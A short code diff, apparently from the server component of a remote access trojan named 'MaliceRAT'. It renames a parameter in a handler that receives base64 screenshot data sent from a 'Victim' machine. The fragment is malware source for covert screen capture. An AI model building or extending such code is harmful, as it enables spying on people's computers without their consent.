@@ -20,11 +20,11 @@ namespace MaliceRAT.RatServer
             server.MessageReceived += HandleMessage;
         }
 
-        private void HandleMessage(Victim victim, dynamic jsonMessage)
+        private void HandleMessage(Victim victim, dynamic message)
         {
-            if (jsonMessage["type"] == "screenshot")
+            if (message["type"] == "screenshot")
             {
-                byte[] screenshotData = Convert.FromBase64String(jsonMessage["data"].ToString());
+                byte[] screenshotData = Convert.FromBase64String(message["data"].ToString());
                 ScreenshotReceived?.Invoke(screenshotData);
             }
         }
